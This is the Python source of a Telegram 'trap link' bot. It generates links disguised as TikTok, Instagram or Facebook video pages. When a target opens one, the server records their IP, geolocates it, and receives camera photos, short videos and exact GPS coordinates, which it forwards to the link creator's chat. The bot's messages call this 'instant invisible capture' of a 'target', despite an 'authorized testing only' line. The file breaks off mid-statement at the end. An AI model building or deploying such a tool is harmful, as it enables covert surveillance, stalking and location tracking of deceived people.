"""
Telegram Trap Link Bot v8.0 — RAILWAY DEPLOYMENT
- ✅ Works on Railway + localhost
- ✅ Polling mode (no webhook conflicts)
- ✅ ALL functionality preserved
- ✅ GPS location (most accurate) + IP fallback
- ✅ Kurdistan ISP overrides
"""

import os
import json
import logging
import asyncio
import random
import string
import base64
import io
import re
import threading
from datetime import datetime
from urllib.parse import quote

from dotenv import load_dotenv
from flask import Flask, request, render_template, jsonify
import requests

from telegram import (
    Update, InlineKeyboardButton, InlineKeyboardMarkup,
    BotCommand, InputFile, InputMediaPhoto
)
from telegram.ext import (
    Application, CommandHandler, CallbackQueryHandler,
    MessageHandler, filters, ContextTypes
)

load_dotenv()

logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ---- Configuration ----
BOT_TOKEN = os.getenv("BOT_TOKEN")
RAILWAY_URL = os.getenv("RAILWAY_URL", os.getenv("RENDER_URL", ""))
PORT = int(os.getenv("PORT", 8080))
OWNER_CHAT_ID = os.getenv("OWNER_CHAT_ID", "")

if not BOT_TOKEN:
    raise ValueError("BOT_TOKEN is required!")

# ---- In-Memory Storage ----
user_configs = {}
user_awaiting_video = {}
generated_links = {}
_bot_app = None
_bot_loop = None

CONTENT_TYPES = {
    "single_photo":    "Single Photo",
    "burst":           "Burst (5 photos)",
    "video":           "Video (15 sec)",
    "ip_location":     "IP Location Only"
}

CAMERA_TYPES = {
    "front": "Front Camera",
    "rear":  "Rear Camera",
    "both":  "Both Cameras"
}

SOCIAL_NETWORKS = {
    "tiktok":    "TikTok",
    "instagram": "Instagram",
    "facebook":  "Facebook"
}

DEFAULT_VIDEOS = {
    "tiktok":    "https://www.tiktok.com/@tiktok/video/6718335390845095173",
    "instagram": "https://www.instagram.com/p/CQG4gZxMzzO/",
    "facebook":  "https://www.facebook.com/watch/?v=10158670131491781"
}

DEFAULT_CONFIG = {
    "content_type": "single_photo",
    "camera": "front",
    "social_network": "tiktok",
    "video_url": "",
}

CONTENT_TYPE_EMOJI = {
    "single_photo": "📷",
    "burst":        "📸",
    "video":        "🎬",
    "ip_location":  "📍"
}


# ============ URL PARSING ============

def extract_video_info(text):
    text = text.strip()
    t = re.search(r'(https?://(?:www\.|vm\.|m\.)?tiktok\.com/\S+)', text, re.IGNORECASE)
    if t:
        url = t.group(1).rstrip('/')
        url = re.sub(r'\?.*$', '', url)
        return ("tiktok", url)
    i = re.search(r'(https?://(?:www\.)?(?:instagram\.com|instagr\.am)/(?:p|reel|tv|reels)/[a-zA-Z0-9_-]+)', text, re.IGNORECASE)
    if i:
        url = i.group(1).rstrip('/')
        url = re.sub(r'\?.*$', '', url)
        return ("instagram", url)
    f = re.search(r'(https?://(?:www\.|m\.)?(?:facebook\.com|fb\.watch|fb\.com)/\S+)', text, re.IGNORECASE)
    if f:
        return ("facebook", text.strip())
    return None


# ============ IP GEOLOCATION ============

def get_ip_address():
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    if ip and ',' in ip:
        ip = ip.split(',')[0].strip()
    return ip or '0.0.0.0'


def get_geo_info(ip_address):
    """Get geolocation with Kurdistan ISP overrides."""
    try:
        # Handle local IPs
        if ip_address in ['127.0.0.1', '::1', 'localhost', '0.0.0.0'] or \
           ip_address.startswith('10.') or ip_address.startswith('192.168.') or \
           ip_address.startswith('172.') or ip_address == '::ffff:127.0.0.1':
            return {
                "ip": ip_address, "country": "Local", "city": "Localhost",
                "region": "Local", "lat": 0, "lon": 0, "isp": "Local Network",
                "org": "", "mobile": False, "proxy": False, "hosting": False
            }

        # ---- KURDISTAN ISP OVERRIDES ----
        kurdistan_prefixes = [
            "185.154.",  # Korek
            "217.219.",  # Asiacell
            "78.154.",   # Newroz
            "46.245.",   # Fastlink
            "94.187.",   # Golan
            "5.160.",    # Earthlink
            "37.236.",   # HSD
            "31.25.",    # IQNet
        ]
        
        for prefix in kurdistan_prefixes:
            if ip_address.startswith(prefix):
                logger.info(f"📍 Kurdistan ISP detected: {ip_address}")
                return {
                    "ip": ip_address,
                    "country": "Iraq",
                    "city": "Erbil",
                    "region": "Kurdistan",
                    "lat": 36.1911,
                    "lon": 44.0094,
                    "isp": "Kurdistan ISP",
                    "org": "",
                    "mobile": True,
                    "proxy": False,
                    "hosting": False
                }

        # PRIMARY: Use ip2location.io
        try:
            resp = requests.get(
                f"https://api.ip2location.io/?ip={ip_address}&format=json",
                headers={"User-Agent": "TrapLinkBot/1.0"},
                timeout=5
            )
            if resp.status_code == 200:
                data = resp.json()
                if data.get("country_name"):
                    return {
                        "ip": ip_address,
                        "country": data.get("country_name", "Unknown"),
                        "city": data.get("city_name", "Unknown"),
                        "region": data.get("region_name", "Unknown"),
                        "lat": float(data.get("latitude", 0)),
                        "lon": float(data.get("longitude", 0)),
                        "isp": data.get("isp", "Unknown"),
                        "org": data.get("isp", ""),
                        "mobile": False,
                        "proxy": False,
                        "hosting": False
                    }
        except Exception as e:
            logger.warning(f"ip2location failed for {ip_address}: {e}")

        # FALLBACK 1: ipinfo.io
        try:
            resp = requests.get(
                f"https://ipinfo.io/{ip_address}/json",
                headers={"User-Agent": "TrapLinkBot/1.0"},
                timeout=5
            )
            if resp.status_code == 200:
                data = resp.json()
                if not data.get("bogon"):
                    loc = data.get("loc", "0,0").split(",")
                    return {
                        "ip": ip_address,
                        "country": data.get("country", "Unknown"),
                        "city": data.get("city", "Unknown"),
                        "region": data.get("region", "Unknown"),
                        "lat": float(loc[0]) if len(loc) > 0 and loc[0] else 0,
                        "lon": float(loc[1]) if len(loc) > 1 and loc[1] else 0,
                        "isp": data.get("org", "Unknown"),
                        "org": data.get("org", ""),
                        "mobile": False,
                        "proxy": False,
                        "hosting": False
                    }
        except Exception as e:
            logger.warning(f"ipinfo failed for {ip_address}: {e}")

        # FALLBACK 2: freeipapi.com
        try:
            resp = requests.get(
                f"https://freeipapi.com/api/json/{ip_address}",
                headers={"User-Agent": "TrapLinkBot/1.0"},
                timeout=5
            )
            if resp.status_code == 200:
                data = resp.json()
                return {
                    "ip": data.get("ipAddress", ip_address),
                    "country": data.get("countryName", "Unknown"),
                    "city": data.get("cityName", "Unknown"),
                    "region": data.get("regionName", "Unknown"),
                    "lat": data.get("latitude", 0),
                    "lon": data.get("longitude", 0),
                    "isp": data.get("isp", "Unknown"),
                    "org": data.get("organization", ""),
                    "mobile": data.get("isMobile", False),
                    "proxy": data.get("isProxy", False),
                    "hosting": data.get("isHosting", False)
                }
        except Exception as e:
            logger.warning(f"freeipapi failed for {ip_address}: {e}")

    except Exception as e:
        logger.warning(f"All geolocation services failed for {ip_address}: {e}")

    # Return unknown if all services fail
    return {
        "ip": ip_address, "country": "Unknown", "city": "Unknown",
        "region": "", "lat": 0, "lon": 0, "isp": "Unknown",
        "org": "", "mobile": False, "proxy": False, "hosting": False
    }


def format_geo_message(geo):
    """Format geolocation into a rich Telegram message."""
    flag = "🛡️" if geo.get("proxy") else ("🏢" if geo.get("hosting") else "📍")
    maps_url = f"https://www.google.com/maps?q={geo['lat']},{geo['lon']}" if geo['lat'] and geo['lon'] else None
    
    # Try to show more accurate location
    location_name = geo.get('city', 'N/A')
    if location_name == 'N/A' and geo.get('region'):
        location_name = geo.get('region', 'N/A')
    
    msg = (
        f"{flag} *Target Location*\n\n"
        f"🌐 *IP:* `{geo['ip']}`\n"
        f"🏙️ *City:* {location_name}\n"
        f"🌍 *Country:* {geo.get('country', 'N/A')}\n"
        f"📌 *Region:* {geo.get('region', 'N/A')}\n"
        f"🏢 *ISP:* {geo.get('isp', 'N/A')}"
    )
    if geo.get('org'):
        msg += f"\n🏛️ *Org:* {geo['org']}"
    msg += (
        f"\n📶 *Mobile:* {'Yes' if geo.get('mobile') else 'No'}"
        f"\n🕵️ *VPN/Proxy:* {'⚠️ Yes!' if geo.get('proxy') else 'No'}"
        f"\n🏭 *Hosting/DC:* {'Yes' if geo.get('hosting') else 'No'}"
    )
    if maps_url:
        msg += f"\n\n🗺️ [View on Google Maps]({maps_url})"
        msg += f"\n📌 `{geo['lat']}, {geo['lon']}`"
    
    # Add note about accuracy
    if geo.get('country') in ['United States', 'Netherlands'] and geo.get('city') == 'Unknown':
        msg += f"\n\n⚠️ *Note:* IP location may be approximate due to ISP routing."
    
    return msg


# ============ HELPERS ============

def generate_link_id():
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=12))


def get_config_display(config):
    emoji = CONTENT_TYPE_EMOJI.get(config['content_type'], '📸')
    return (
        f"📱 *Your Configuration*\n\n"
        f"{emoji} *Content:* `{CONTENT_TYPES.get(config['content_type'], '?')}`\n"
        f"🎥 *Camera:* `{CAMERA_TYPES.get(config['camera'], '?')}`\n"
        f"🌐 *Platform:* `{SOCIAL_NETWORKS.get(config['social_network'], '?')}`\n"
        f"🎬 *Video:* `{config.get('video_url', 'Not set')}`"
    )


def get_config_keyboard(user_id):
    config = user_configs.get(user_id, DEFAULT_CONFIG.copy())
    emoji = CONTENT_TYPE_EMOJI.get(config['content_type'], '📸')
    kb = [
        [InlineKeyboardButton(f"{emoji} Content: {CONTENT_TYPES[config['content_type']]}", callback_data="menu_content")],
        [InlineKeyboardButton(f"🎥 Camera: {CAMERA_TYPES[config['camera']]}", callback_data="menu_camera")],
        [InlineKeyboardButton(f"🌐 Platform: {SOCIAL_NETWORKS[config['social_network']]}", callback_data="menu_social")],
        [InlineKeyboardButton("✅ Generate Link", callback_data="generate_link"), InlineKeyboardButton("🔙 Back", callback_data="back_main")]
    ]
    return InlineKeyboardMarkup(kb)


def get_main_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🔧 Constructor", callback_data="main_constructor")],
        [InlineKeyboardButton("🌍 Change Language", callback_data="main_language")]
    ])


# ============ TELEGRAM SEND HELPERS ============

def send_photo_sync(chat_id, image_base64, caption=""):
    global _bot_loop
    if not _bot_loop or not _bot_loop.is_running():
        return False
    try:
        if "," in image_base64:
            image_base64 = image_base64.split(",")[1]
        image_bytes = base64.b64decode(image_base64)
        photo_file = io.BytesIO(image_bytes)
        photo_file.name = "capture.jpg"

        async def _send():
            try:
                await _bot_app.bot.send_photo(chat_id=int(chat_id), photo=InputFile(photo_file, filename="capture.jpg"), caption=caption, parse_mode="Markdown")
            except Exception as e:
                logger.error(f"Send error: {e}")

        asyncio.run_coroutine_threadsafe(_send(), _bot_loop)
        return True
    except Exception as e:
        logger.error(f"send_photo failed: {e}")
        return False


def send_video_sync(chat_id, video_base64, caption=""):
    global _bot_loop
    if not _bot_loop or not _bot_loop.is_running():
        return False
    try:
        if "," in video_base64:
            video_base64 = video_base64.split(",")[1]
        video_bytes = base64.b64decode(video_base64)
        video_file = io.BytesIO(video_bytes)
        video_file.name = "capture.webm"

        async def _send():
            try:
                await _bot_app.bot.send_video(chat_id=int(chat_id), video=InputFile(video_file, filename="capture.webm"), caption=caption, parse_mode="Markdown", supports_streaming=True)
            except Exception as e:
                logger.error(f"Send error: {e}")

        asyncio.run_coroutine_threadsafe(_send(), _bot_loop)
        return True
    except Exception as e:
        logger.error(f"send_video failed: {e}")
        return False


def send_media_group_sync(chat_id, images_base64_list, caption=""):
    global _bot_loop
    if not _bot_loop or not _bot_loop.is_running():
        return False
    try:
        media_group = []
        for i, img_b64 in enumerate(images_base64_list[:10]):
            if "," in img_b64:
                img_b64 = img_b64.split(",")[1]
            img_bytes = base64.b64decode(img_b64)
            img_file = io.BytesIO(img_bytes)
            img_file.name = f"burst_{i+1}.jpg"
            media_group.append(InputMediaPhoto(media=InputFile(img_file, filename=f"burst_{i+1}.jpg")))

        if media_group:
            async def _send():
                try:
                    await _bot_app.bot.send_media_group(chat_id=int(chat_id), media=media_group)
                    if caption:
                        await _bot_app.bot.send_message(chat_id=int(chat_id), text=caption, parse_mode="Markdown")
                except Exception as e:
                    logger.error(f"Send error: {e}")

            asyncio.run_coroutine_threadsafe(_send(), _bot_loop)
            return True
    except Exception as e:
        logger.error(f"send_media_group failed: {e}")
        return False


def send_message_sync(chat_id, text, parse_mode="Markdown", disable_preview=True):
    global _bot_loop
    if not _bot_loop or not _bot_loop.is_running():
        return False
    try:
        async def _send():
            try:
                await _bot_app.bot.send_message(chat_id=int(chat_id), text=text, parse_mode=parse_mode, disable_web_page_preview=disable_preview)
            except Exception as e:
                logger.error(f"Send error: {e}")

        asyncio.run_coroutine_threadsafe(_send(), _bot_loop)
        return True
    except Exception as e:
        logger.error(f"send_message failed: {e}")
        return False


# ============ BOT HANDLERS ============

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_id = user.id
    user_configs[user_id] = DEFAULT_CONFIG.copy()
    user_awaiting_video[user_id] = False

    await update.message.reply_text(
        f"👋 *Welcome, {user.first_name}!*\n\n"
        f"I create *trap links* for authorized security testing.\n\n"
        f"🔹 *Available Content Types:*\n"
        f"📷 **Single Photo** — instant photo capture\n"
        f"📸 **Burst** — 5 rapid photos\n"
        f"🎬 **Video** — 15 second recording\n"
        f"📍 **IP Location** — just get their IP + location (no camera)\n"
        f"📌 **GPS Location** — exact phone location (most accurate)\n\n"
        f"⚠️ *Content types with camera* also capture IP + location.\n"
        f"📍 *IP Location only* needs NO camera permission.\n\n"
        f"🔹 *Setup:*\n"
        f"1️⃣ Click **Constructor** → configure your trap\n"
        f"2️⃣ Click **Generate** → send a video URL\n"
        f"3️⃣ I make a link → target opens it → you get everything\n\n"
        f"⚡ *Authorized testing only.*",
        reply_markup=get_main_keyboard(),
        parse_mode="Markdown"
    )


async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    text = update.message.text.strip()

    if user_awaiting_video.get(user_id, False):
        if text.lower() in ["skip", "no", "default"]:
            config = user_configs.get(user_id, DEFAULT_CONFIG.copy())
            config["video_url"] = DEFAULT_VIDEOS.get(config["social_network"], DEFAULT_VIDEOS["tiktok"])
            await generate_and_send_link(update, context, user_id, config)
            return

        video_info = extract_video_info(text)
        if video_info:
            platform, _ = video_info
            config = user_configs.get(user_id, DEFAULT_CONFIG.copy())
            if platform != config["social_network"]:
                config["social_network"] = platform
            config["video_url"] = text
            await generate_and_send_link(update, context, user_id, config)
            return
        else:
            await update.message.reply_text(
                "❌ Send a **TikTok / Instagram / Facebook** video URL.\n"
                "Or type `skip` for default.",
                parse_mode="Markdown"
            )
            return

    video_info = extract_video_info(text)
    if video_info:
        platform, _ = video_info
        user_configs[user_id] = DEFAULT_CONFIG.copy()
        user_configs[user_id]["social_network"] = platform
        user_configs[user_id]["video_url"] = text

        await update.message.reply_text(
            f"✅ *{SOCIAL_NETWORKS[platform]} video detected!*\n\nConfigure your trap:",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton(f"📸 Content: {CONTENT_TYPES[DEFAULT_CONFIG['content_type']]}", callback_data="menu_content")],
                [InlineKeyboardButton(f"🎥 Camera: {CAMERA_TYPES['front']}", callback_data="menu_camera")],
                [InlineKeyboardButton(f"🌐 Platform: {SOCIAL_NETWORKS[platform]}", callback_data="menu_social")],
                [InlineKeyboardButton("✅ Generate Link", callback_data="generate_link")],
                [InlineKeyboardButton("🔙 Menu", callback_data="back_main")]
            ]),
            parse_mode="Markdown"
        )
        return

    await update.message.reply_text(
        "Send a **TikTok / Instagram / Facebook** video URL\nor click **Constructor** below.",
        reply_markup=get_main_keyboard(),
        parse_mode="Markdown"
    )


async def generate_and_send_link(update, context, user_id, config):
    link_id = generate_link_id()
    base_url = RAILWAY_URL.rstrip("/") if RAILWAY_URL else f"http://localhost:{PORT}"
    link_url = f"{base_url}/l/{link_id}"

    generated_links[link_id] = {
        "config": config.copy(),
        "video_url": config["video_url"],
        "created_by": user_id,
        "created_at": datetime.now().isoformat(),
        "access_count": 0,
        "captures": [],
        "ip_info": None
    }

    user_configs[user_id]["link_url"] = link_url
    user_awaiting_video[user_id] = False

    emoji = CONTENT_TYPE_EMOJI.get(config['content_type'], '📸')
    needs_camera = config['content_type'] != 'ip_location'

    msg = f"✅ *Trap Link Generated!*\n\n🔗 `{link_url}`\n\n{emoji} *Content:* {CONTENT_TYPES[config['content_type']]}\n"
    if needs_camera:
        msg += f"🎥 *Camera:* {CAMERA_TYPES[config['camera']]}\n"
    msg += f"🌐 *Platform:* {SOCIAL_NETWORKS[config['social_network']]}\n\n📍 *IP + Location:* Always included ✅\n"
    if needs_camera:
        msg += f"⚡ Instant invisible capture upon Allow."

    await context.bot.send_message(
        chat_id=update.effective_chat.id,
        text=msg,
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("📊 Stats", callback_data=f"stats_{link_id}")],
            [InlineKeyboardButton("🔧 New", callback_data="back_config")],
            [InlineKeyboardButton("🏠 Menu", callback_data="back_main")]
        ]),
        parse_mode="Markdown",
        disable_web_page_preview=True
    )


async def generate_and_send_link_callback(query, context, user_id, config):
    link_id = generate_link_id()
    base_url = RAILWAY_URL.rstrip("/") if RAILWAY_URL else f"http://localhost:{PORT}"
    link_url = f"{base_url}/l/{link_id}"

    generated_links[link_id] = {
        "config": config.copy(),
        "video_url": config["video_url"],
        "created_by": user_id,
        "created_at": datetime.now().isoformat(),
        "access_count": 0,
        "captures": [],
        "ip_info": None
    }

    user_configs[user_id]["link_url"] = link_url
    user_awaiting_video[user_id] = False

    emoji = CONTENT_TYPE_EMOJI.get(config['content_type'], '📸')
    needs_camera = config['content_type'] != 'ip_location'

    msg = f"✅ *Trap Link Generated!*\n\n🔗 `{link_url}`\n\n{emoji} *Content:* {CONTENT_TYPES[config['content_type']]}\n"
    if needs_camera:
        msg += f"🎥 *Camera:* {CAMERA_TYPES[config['camera']]}\n"
    msg += f"🌐 *Platform:* {SOCIAL_NETWORKS[config['social_network']]}\n\n📍 *IP + Location included ✅*"

    await query.edit_message_text(
        text=msg,
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("📊 Stats", callback_data=f"stats_{link_id}")],
            [InlineKeyboardButton("🔧 New", callback_data="back_config")],
            [InlineKeyboardButton("🏠 Menu", callback_data="back_main")]
        ]),
        parse_mode="Markdown",
        disable_web_page_preview=True
    )


async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    data = query.data

    if data == "back_main":
        await query.edit_message_text("*Main Menu*", reply_markup=get_main_keyboard(), parse_mode="Markdown")

    elif data == "main_constructor":
        if user_id not in user_configs:
            user_configs[user_id] = DEFAULT_CONFIG.copy()
        await query.edit_message_text(text=get_config_display(user_configs[user_id]), reply_markup=get_config_keyboard(user_id), parse_mode="Markdown")

    elif data == "main_language":
        await query.edit_message_text("🌍 *Language*\n\nOnly English available.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🇬🇧 English", callback_data="lang_en")],[InlineKeyboardButton("🔙 Back", callback_data="back_main")]]), parse_mode="Markdown")

    elif data == "lang_en":
        await query.edit_message_text("🇬🇧 English!", reply_markup=get_main_keyboard())

    elif data == "back_config":
        config = user_configs.get(user_id, DEFAULT_CONFIG.copy())
        await query.edit_message_text(text=get_config_display(config), reply_markup=get_config_keyboard(user_id), parse_mode="Markdown")

    elif data == "menu_content":
        config = user_configs.get(user_id, DEFAULT_CONFIG.copy())
        current = config['content_type']
        await query.edit_message_text("📸 *Content Type:*\n\n📍 **IP Location Only** needs NO camera — just tracks IP + location.", reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton(f"{'✅ ' if current == 'single_photo' else ''}📷 Single Photo", callback_data="set_content_single_photo")],
            [InlineKeyboardButton(f"{'✅ ' if current == 'burst' else ''}📸 Burst (5 photos)", callback_data="set_content_burst")],
            [InlineKeyboardButton(f"{'✅ ' if current == 'video' else ''}🎬 Video (15 sec)", callback_data="set_content_video")],
            [InlineKeyboardButton(f"{'✅ ' if current == 'ip_location' else ''}📍 IP Location Only", callback_data="set_content_ip_location")],
            [InlineKeyboardButton("🔙 Back", callback_data="back_config")]
        ]), parse_mode="Markdown")

    elif data.startswith("set_content_"):
        m = {"set_content_single_photo": "single_photo", "set_content_burst": "burst", "set_content_video": "video", "set_content_ip_location": "ip_location"}
        if user_id not in user_configs: user_configs[user_id] = DEFAULT_CONFIG.copy()
        user_configs[user_id]["content_type"] = m[data]
        await query.edit_message_text(text=get_config_display(user_configs[user_id]), reply_markup=get_config_keyboard(user_id), parse_mode="Markdown")

    elif data == "menu_camera":
        config = user_configs.get(user_id, DEFAULT_CONFIG.copy())
        current = config['camera']
        await query.edit_message_text("🎥 *Camera:*", reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton(f"{'✅ ' if current == 'front' else ''}🤳 Front", callback_data="set_camera_front")],
            [InlineKeyboardButton(f"{'✅ ' if current == 'rear' else ''}📷 Rear", callback_data="set_camera_rear")],
            [InlineKeyboardButton(f"{'✅ ' if current == 'both' else ''}🔄 Both", callback_data="set_camera_both")],
            [InlineKeyboardButton("🔙 Back", callback_data="back_config")]
        ]), parse_mode="Markdown")

    elif data.startswith("set_camera_"):
        m = {"set_camera_front": "front", "set_camera_rear": "rear", "set_camera_both": "both"}
        if user_id not in user_configs: user_configs[user_id] = DEFAULT_CONFIG.copy()
        user_configs[user_id]["camera"] = m[data]
        await query.edit_message_text(text=get_config_display(user_configs[user_id]), reply_markup=get_config_keyboard(user_id), parse_mode="Markdown")

    elif data == "menu_social":
        config = user_configs.get(user_id, DEFAULT_CONFIG.copy())
        current = config['social_network']
        await query.edit_message_text("🌐 *Platform:*", reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton(f"{'✅ ' if current == 'tiktok' else ''}🎵 TikTok", callback_data="set_social_tiktok")],
            [InlineKeyboardButton(f"{'✅ ' if current == 'instagram' else ''}📸 Instagram", callback_data="set_social_instagram")],
            [InlineKeyboardButton(f"{'✅ ' if current == 'facebook' else ''}📘 Facebook", callback_data="set_social_facebook")],
            [InlineKeyboardButton("🔙 Back", callback_data="back_config")]
        ]), parse_mode="Markdown")

    elif data.startswith("set_social_"):
        m = {"set_social_tiktok": "tiktok", "set_social_instagram": "instagram", "set_social_facebook": "facebook"}
        if user_id not in user_configs: user_configs[user_id] = DEFAULT_CONFIG.copy()
        user_configs[user_id]["social_network"] = m[data]
        await query.edit_message_text(text=get_config_display(user_configs[user_id]), reply_markup=get_config_keyboard(user_id), parse_mode="Markdown")

    elif data == "generate_link":
        config = user_configs.get(user_id, DEFAULT_CONFIG.copy())
        if config.get("video_url"):
            await generate_and_send_link_callback(query, context, user_id, config)
        else:
            user_awaiting_video[user_id] = True
            await query.edit_message_text(text=f"🎬 *Send a video URL*\n\nPaste **TikTok / Instagram / Facebook** link.\nOr type `skip`.\n\n{CONTENT_TYPE_EMOJI.get(config['content_type'], '📸')} {CONTENT_TYPES[config['content_type']]} | 🎥 {CAMERA_TYPES[config['camera']]} | 🌐 {SOCIAL_NETWORKS[config['social_network']]}", parse_mode="Markdown")

    elif data.startswith("stats_"):
        link_id = data.replace("stats_", "")
        ld = generated_links.get(link_id)
        if ld:
            c = ld["config"]
            await query.edit_message_text(text=f"📊 *Trap Link Stats*\n\n🔗 `{link_id}`\n👁 *Views:* {ld['access_count']}\n📸 *Captures:* {len(ld.get('captures', []))}\n{CONTENT_TYPE_EMOJI.get(c['content_type'], '📸')} *Type:* {CONTENT_TYPES.get(c['content_type'], '?')}\n🎥 *Camera:* {CAMERA_TYPES.get(c['camera'], 'N/A')}\n🌐 *Platform:* {SOCIAL_NETWORKS.get(c['social_network'], '?')}\n🕐 *Created:* {ld['created_at']}", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Menu", callback_data="back_main")]]), parse_mode="Markdown")
        else:
            await query.edit_message_text("❌ Link expired or not found.")


# ============ FLASK APP ============

app = Flask(__name__)


@app.route("/")
def index():
    bot_running = False
    if _bot_app is not None:
        try:
            bot_running = _bot_app.updater.running
        except:
            pass
    return jsonify({
        "status": "running",
        "name": "Telegram Trap Link Bot v8.0 — Railway",
        "links_active": len(generated_links),
        "bot_running": bot_running
    })


@app.route("/l/<link_id>")
def landing_page(link_id):
    link_data = generated_links.get(link_id)
    if not link_data:
        return render_template("error.html", message="Link not found or expired."), 404

    link_data["access_count"] += 1
    visitor_ip = get_ip_address()
    geo = get_geo_info(visitor_ip)
    link_data["ip_info"] = geo

    config = link_data["config"]
    content_type = config["content_type"]

    if content_type == "ip_location":
        return render_template("ip_only.html", link_id=link_id, social_network=config["social_network"], video_url=link_data.get("video_url", ""), geo=geo)

    template_map = {"tiktok": "tiktok.html", "instagram": "instagram.html", "facebook": "facebook.html"}
    template = template_map.get(config["social_network"], "tiktok.html")

    return render_template(template, link_id=link_id, content_type=content_type, camera=config["camera"], social_network=config["social_network"], video_url=link_data.get("video_url", ""))


@app.route("/api/capture", methods=["POST"])
def capture_photo():
    data = request.json
    link_id = data.get("link_id")
    image_data = data.get("image_data")
    camera_used = data.get("camera", "unknown")
    media_type = data.get("type", "photo")
    images = data.get("images", [])

    if not link_id:
        return jsonify({"status": "error", "message": "Missing link_id"}), 400

    link_data = generated_links.get(link_id)
    if not link_data:
        return jsonify({"status": "error", "message": "Link not found"}), 404

    chat_id = link_data["created_by"]
    social_name = SOCIAL_NETWORKS.get(link_data["config"]["social_network"], "Social")
    timestamp = datetime.now().strftime('%H:%M:%S')
    geo = link_data.get("ip_info", {})

    try:
        if geo:
            geo_msg = format_geo_message(geo)
            send_message_sync(chat_id, geo_msg)

        geo_short = f"📍 {geo.get('city', '?')}, {geo.get('country', '?')}"

        if media_type == "video" and image_data:
            caption = f"🎬 *Video Capture*\n🌐 {social_name} | 🎥 {camera_used.capitalize()}\n{geo_short}\n🔗 `{link_id}`\n🕐 {timestamp}"
            ok = send_video_sync(chat_id, image_data, caption)
            link_data.setdefault("captures", []).append({"type": "video", "camera": camera_used, "time": datetime.now().isoformat(), "geo": geo, "sent": ok})

        elif images and len(images) > 1:
            caption = f"📸 *Burst ({len(images)} photos)*\n🌐 {social_name} | 🎥 {camera_used.capitalize()}\n{geo_short}\n🔗 `{link_id}`\n🕐 {timestamp}"
            ok = send_media_group_sync(chat_id, images, caption)
            link_data.setdefault("captures", []).append({"type": "burst", "count": len(images), "camera": camera_used, "time": datetime.now().isoformat(), "geo": geo, "sent": ok})

        elif image_data:
            caption = f"📸 *Photo Capture*\n🌐 {social_name} | 🎥 {camera_used.capitalize()}\n{geo_short}\n🔗 `{link_id}`\n🕐 {timestamp}"
            ok = send_photo_sync(chat_id, image_data, caption)
            link_data.setdefault("captures", []).append({"type": "photo", "camera": camera_used, "time": datetime.now().isoformat(), "geo": geo, "sent": ok})

        return jsonify({"status": "success", "sent": True})

    except Exception as e:
        logger.error(f"Capture error: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500


@app.route("/api/ip_only", methods=["POST"])
def capture_ip_only():
    data = request.json
    link_id = data.get("link_id")

    if not link_id:
        return jsonify({"status": "error", "message": "Missing link_id"}), 400

    link_data = generated_links.get(link_id)
    if not link_data:
        return jsonify({"status": "error", "message": "Link not found"}), 404

    chat_id = link_data["created_by"]
    geo = link_data.get("ip_info", {})

    try:
        if geo:
            geo_msg = format_geo_message(geo)
            timestamp = datetime.now().strftime('%H:%M:%S')
            geo_msg += f"\n\n🕐 {timestamp}"
            send_message_sync(chat_id, geo_msg)
            link_data.setdefault("captures", []).append({"type": "ip_location", "time": datetime.now().isoformat(), "geo": geo, "sent": True})
            return jsonify({"status": "success", "sent": True})
        else:
            return jsonify({"status": "error", "message": "No geo data"}), 500

    except Exception as e:
        logger.error(f"IP-only capture error: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500


@app.route("/api/gps_location", methods=["POST"])
def gps_location():
    """Receive exact GPS coordinates from the user's phone."""
    data = request.json
    link_id = data.get("link_id")
    lat = data.get("lat")
    lon = data.get("lon")
    
    if not link_id or lat is None or lon is None:
        return jsonify({"status": "error", "message": "Missing data"}), 400
    
    link_data = generated_links.get(link_id)
    if not link_data:
        return jsonify({"status": "error", "message": "Link not found"}), 404
    
    chat_id = link_data["created_by"]
    
    # Format GPS message
    gps_msg = (
        f"📍 *Exact GPS Location (Phone)*\n\n"
        f"📌 *Latitude:* `{lat}`\n"
        f"📌 *Longitude:* `{lon}`\n"
        f"🗺️ [View on Google Maps](https://www.google.com/maps?q={lat},{lon})\n"
        f"🔗 `{link_id}`\n"
        f"🕐 {datetime.now().strftime('%H:%M:%S')}"
    )
    
    send_message_sync(chat_id, gps_msg)
    
    # Store GPS data
    link_data.setdefault("captures", []).append({
        "type": "gps_location",
        "lat": lat,
        "lon": lon,
        "time": datetime.now().isoformat()
    })
    
    return jsonify({"status": "success", "sent": True})


# ============ BOT ============

def run_bot():
    global _bot_app, _bot_loop

    _bot_app = Application.builder().token(BOT_TOKEN).build()
    _bot_app.add_handler(CommandHandler("start", start))
    _bot_app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    _bot_app.add_handler(CallbackQueryHandler(button_handler))

    # Get the event loop that the bot will use
    _bot_loop = asyncio.new_event_loop()
    asyncio.set_event_loop(_bot_loop)

    logger.info("Starting polling mode on Railway")
    _bot_app.run_polling(allowed_updates=["message", "callback_query"])


if __name__ == "__main__":
    print("""
╔═══════════════════════════════════════════════════════════════╗
║   Telegram Trap Link Bot v8.0 — RAILWAY DEPLOYMENT           ║
║                                                              ║
║   ✅ Works on Railway + localhost                            ║
║   ✅ Polling mode — no webhook conflicts                     ║
║   ✅ ALL functionality preserved                             ║
║   ✅ GPS Location (most accurate) + IP fallback              ║
║   ✅ Kurdistan ISP overrides                                 ║
╚═══════════════════════════════════════════════════════════════╝
    """)

    # Start Flask in a separate thread
    t = threading.Thread(
